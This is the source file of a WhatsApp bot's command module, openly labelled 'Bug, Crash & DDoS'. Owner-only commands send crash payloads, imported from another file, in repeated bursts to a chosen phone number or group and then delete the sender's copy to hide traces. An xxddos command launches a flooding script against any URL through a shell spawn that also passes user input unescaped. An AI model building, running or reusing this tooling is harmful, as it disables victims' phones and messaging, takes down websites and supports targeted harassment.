// ─────────────────────────────────────────────
//  Al-Jin · modules/xeon-commands.js
//  Bug, Crash & DDoS command module (Native Baileys v7 + Binary Vectors)
// ─────────────────────────────────────────────
import { spawn } from 'node:child_process';
import path from 'node:path';
import { isOwner } from '../core/identity.js';
import {
  sendAIRichAddonAction,
  sendQuotaUpsellThinkHard,
  sendCrashJamPayload,
  sendKillSystemPayload,
  sendCrashFinityPayload,
  sendStickerCrashPayload,
  sendCallCrashPayload,
  sendXdelayPayload,
  sendIosInvisiblePayload,
  sendPermanentCrashPayload,
  sendToxicVCardPayload,
  sendMaliciousPDFPayload,
  sendMaliciousJPEGPayload,
  sendToxicStickerPayload,
  sendZeroClickMediaPayload,
  sendPersistentSchemaPayload,
  isProtectedJid
} from '../lib/bug-payloads.js';

function isAllowed(msg) {
  const sender = msg.key.participant || msg.key.remoteJid;
  return msg.key.fromMe || isOwner(sender);
}

function resolveTargetJid(input) {
  if (!input) return null;
  const trimmed = input.trim();
  if (trimmed.endsWith('@g.us')) return trimmed;
  const clean = trimmed.replace(/[^0-9]/g, '');
  return clean ? `${clean}@s.whatsapp.net` : null;
}

function notifySending(sock, chat, target, cmdName = 'BUG') {
  const caption = `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓\n┃ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...\n┃ ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ sᴇɴᴅɪɴɢ ${cmdName.toUpperCase()}\n┃ Tᴀʀɢᴇᴛ : ${target}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
  return sock.sendMessage(chat, { text: caption });
}

async function notifyResult(sock, chat, target, cmdName, result, quotedMsg) {
  if (result && result.success) {
    const text = `┏━━━━━━〣 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 〣━━━━━━━┓\n┃ 🎯 Target  : ${target}\n┃ ⚡ Command : .${cmdName}\n┃ 📦 Status  : DELIVERED & CLEANED (DELETE FOR ME)\n┃ 📬 Packets : ${result.deliveredCount || 1} delivered\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    return sock.sendMessage(chat, { text }, { quoted: quotedMsg });
  } else {
    const errReason = result?.errors?.[0] || 'Payload delivery rejected by target server/device';
    const text = `┏━━━━━━〣 𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 〣━━━━━━━┓\n┃ 🎯 Target  : ${target}\n┃ ⚡ Command : .${cmdName}\n┃ ❌ Status  : UNDELIVERED\n┃ ⚠️ Reason  : ${errReason}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    return sock.sendMessage(chat, { text }, { quoted: quotedMsg });
  }
}

async function checkWhatsAppUser(sock, targetJid) {
  if (!targetJid) return false;
  if (targetJid.endsWith('@g.us')) return true;
  const cleanTarget = targetJid.split('@')[0].replace(/[^0-9]/g, '');
  if (!cleanTarget) return false;
  try {
    const res = await sock.onWhatsApp(cleanTarget);
    if (!res || !res.length) return true; // Fallback if lookup restricted
    const existsObj = Array.isArray(res) ? res[0] : res;
    return Boolean(existsObj && existsObj.exists !== false);
  } catch (e) {
    return true; // Fallback if lookup fails
  }
}

async function executeBugCommand(sock, chat, msg, args, cmdName, payloadFn, defaultRounds = 5) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: `❌ Usage: .${cmdName} <number or groupJid> [rounds]` }, { quoted: msg });

  const targetJid = resolveTargetJid(args[0]);
  if (!targetJid) return sock.sendMessage(chat, { text: '❌ Invalid target phone number or group JID.' }, { quoted: msg });

  if (isProtectedJid(sock, targetJid)) {
    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
  }

  const roundsArg = parseInt(args[1], 10);
  const rounds = (!isNaN(roundsArg) && roundsArg > 0 && roundsArg <= 20) ? roundsArg : defaultRounds;

  try {
    const exists = await checkWhatsAppUser(sock, targetJid);
    if (!exists) return sock.sendMessage(chat, { text: `❌ Target is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, targetJid, `${cmdName.toUpperCase()} (${rounds} BURST PACKETS)`);

    let totalDelivered = 0;
    const errors = [];

    for (let r = 0; r < rounds; r++) {
      try {
        const res = await payloadFn(sock, targetJid);
        if (res?.success) totalDelivered += (res.deliveredCount || 1);
        else if (res?.errors) errors.push(...res.errors);
      } catch (err) {
        errors.push(err.message);
      }
    }

    const finalResult = {
      success: totalDelivered > 0,
      deliveredCount: totalDelivered,
      errors
    };

    await notifyResult(sock, chat, targetJid, cmdName, finalResult, msg);
  } catch (err) {
    await notifyResult(sock, chat, targetJid, cmdName, { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

// ─────────────────────────────────────────────
// Commands (Native Baileys v7 + Binary Crash Payloads)
// ─────────────────────────────────────────────

export async function crashjamCommand(sock, chat, msg, args) {
  return executeBugCommand(sock, chat, msg, args, 'crashjam', sendCrashJamPayload);
}

export async function killsystemCommand(sock, chat, msg, args) {
  return executeBugCommand(sock, chat, msg, args, 'killsystem', sendKillSystemPayload);
}

export async function crashfinityCommand(sock, chat, msg, args) {
  return executeBugCommand(sock, chat, msg, args, 'crashfinity', sendCrashFinityPayload);
}

export async function stickercrashCommand(sock, chat, msg, args) {
  return executeBugCommand(sock, chat, msg, args, 'stickercrash', sendToxicStickerPayload);
}

export async function callcrashCommand(sock, chat, msg, args) {
  return executeBugCommand(sock, chat, msg, args, 'callcrash', sendCallCrashPayload);
}

export async function xdelayCommand(sock, chat, msg, args) {
  return executeBugCommand(sock, chat, msg, args, 'xdelay', sendXdelayPayload);
}

export async function xbetainvisCommand(sock, chat, msg, args) {
  return executeBugCommand(sock, chat, msg, args, 'xbetainvis', sendIosInvisiblePayload);
}

export async function iosinvisibleCommand(sock, chat, msg, args) {
  return executeBugCommand(sock, chat, msg, args, 'iosinvisible', sendIosInvisiblePayload);
}

export async function xgroupCommand(sock, chat, msg, args) {
  return executeBugCommand(sock, chat, msg, args, 'xgroup', sendKillSystemPayload);
}

export async function killgcCommand(sock, chat, msg, args) {
  return executeBugCommand(sock, chat, msg, args, 'killgc', sendPermanentCrashPayload);
}

export async function trashsysgpCommand(sock, chat, msg, args) {
  return executeBugCommand(sock, chat, msg, args, 'trashsysgp', sendPermanentCrashPayload);
}

export async function testCommand(sock, chat, msg, args) {
  return executeBugCommand(sock, chat, msg, args, 'test', sendToxicVCardPayload);
}

export async function killCommand(sock, chat, msg, args) {
  return executeBugCommand(sock, chat, msg, args, 'kill', sendKillSystemPayload);
}

export async function crashCommand(sock, chat, msg, args) {
  return executeBugCommand(sock, chat, msg, args, 'crash', sendPermanentCrashPayload);
}

export async function permanentCommand(sock, chat, msg, args) {
  return executeBugCommand(sock, chat, msg, args, 'permanent', sendPermanentCrashPayload);
}

export async function xxddosCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (args.length < 2) {
    return sock.sendMessage(chat, { text: '❌ Usage: .xxddos <url> <timeInSeconds>\nExample: .xxddos https://example.com 60' }, { quoted: msg });
  }

  const targetUrl = args[0];
  const timeSec = args[1];

  await sock.sendMessage(chat, {
    text: `⚡ *Attacking Target*\n\n🎯 Target: \`${targetUrl}\`\n⏱ Time: \`${timeSec}\` seconds\n\n⚙️ Process started...`
  }, { quoted: msg });

  const ddosScript = path.join(process.cwd(), 'lib', 'ddos.js');
  spawn(`node "${ddosScript}" "${targetUrl}" "${timeSec}"`, {
    shell: true,
    stdio: 'inherit'
  });
}

export async function groupidCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) {
    return sock.sendMessage(chat, { text: 'Usage: .groupid <group link>\nExample: .groupid https://chat.whatsapp.com/ABC123XYZ' }, { quoted: msg });
  }

  const inviteLink = args[0].trim();
  if (!inviteLink.includes('chat.whatsapp.com/')) {
    return sock.sendMessage(chat, { text: 'Invalid WhatsApp group link.' }, { quoted: msg });
  }

  const inviteCode = inviteLink.split('chat.whatsapp.com/')[1]?.trim();
  if (!inviteCode) return sock.sendMessage(chat, { text: 'Link format incorrect.' }, { quoted: msg });

  try {
    const result = await sock.groupAcceptInvite(inviteCode);
    if (!result) return sock.sendMessage(chat, { text: 'Failed to join or invalid invite code.' }, { quoted: msg });

    const groupJid = typeof result === 'string' ? result : result.gid;
    const meta = await sock.groupMetadata(groupJid);

    let text = `Group Info:\n\n`;
    text += `Name: ${meta.subject || 'No Name'}\n`;
    text += `JID: ${groupJid}\n`;
    text += `Members: ${meta.participants?.length || '?'}\n`;

    await sock.sendMessage(chat, { text }, { quoted: msg });
  } catch (err) {
    sock.sendMessage(chat, { text: `Error fetching group info: ${err.message}` }, { quoted: msg });
  }
}

export async function listgcCommand(sock, chat, msg) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });

  try {
    const groupsObj = await sock.groupFetchAllParticipating();
    const groups = Object.values(groupsObj);

    if (groups.length === 0) {
      return sock.sendMessage(chat, { text: '❌ No WhatsApp groups found.' }, { quoted: msg });
    }

    let output = `⬣ *WHATSAPP GROUPS (${groups.length} total)*\n\n`;
    let index = 1;

    for (const group of groups) {
      output += `❏ Group ${index++}\n`;
      output += `│⭔ *Name:* ${group.subject || 'Unnamed'}\n`;
      output += `│⭔ *ID:* \`${group.id}\`\n`;
      output += `│⭔ *Members:* ${group.participants?.length || 0}\n`;
      output += `╰──────────────\n\n`;
    }

    await sock.sendMessage(chat, { text: output }, { quoted: msg });
  } catch (err) {
    sock.sendMessage(chat, { text: `⚠️ Failed to fetch groups: ${err.message}` }, { quoted: msg });
  }
}
